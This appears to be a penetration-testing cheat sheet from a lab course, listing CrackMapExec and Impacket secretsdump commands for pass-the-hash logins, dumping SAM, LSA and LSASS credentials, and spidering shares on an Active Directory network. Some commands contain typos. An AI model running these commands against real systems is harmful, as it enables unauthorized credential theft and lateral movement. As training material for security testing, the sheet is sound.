**Crackmapexec**:  
crackmapexec smb 10.1.1.10/24 -u fcastle -d marvel.local -p Password1  //pass the password  
crackmapexec smb 10.1.1.0/24 -u adminisrator -H NTLM:HASH --local-auth  //local auth  
crackmapexec smb 10.1.1.0/24 -u administrator -H NTLM:HASH --local-auh --sam  //dump sam  
crackmapexec smb 10.1.1.10/24 -u adminisrator -H NTLM:HASH --local-auth --lsa  //dump lsa  
crackmapexec smb 10.1.1.0/24 -u administrator -H NTLM:HASH --local-auth -M --lsassy  //revels ntlm stored in lsas //valid on top of secretsdump   
crackmapexec smb 10.1.1.0/24 -u administrator -H NTLM:HASH --local-auth --shares   //list shares  
If local admin then see Pwn3d! in output against the target !!  
cmedb  //displays db of cme with stored info  
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'   //list readable files  
When completed, CME writes the results to a JSON file located at /tmp/cme_spider_plus/ipofhost  

  
**Impacket**: https://impacket.panekopanko.se/  
**Secretsdump**: works when cme doesn't work sometime against DC, because if user has dcsync perms this can still dump creds,  
however cme need local admin on target to dump !!  
secretsdump marvel.local/fcastle:'Password1'@10.1.1.1  //with domain user pass  
secretsdump administrator@10.1.1.1 -hashes NTLM:HASH   //local user hash //also reveals wdigest cleartext creds if any    


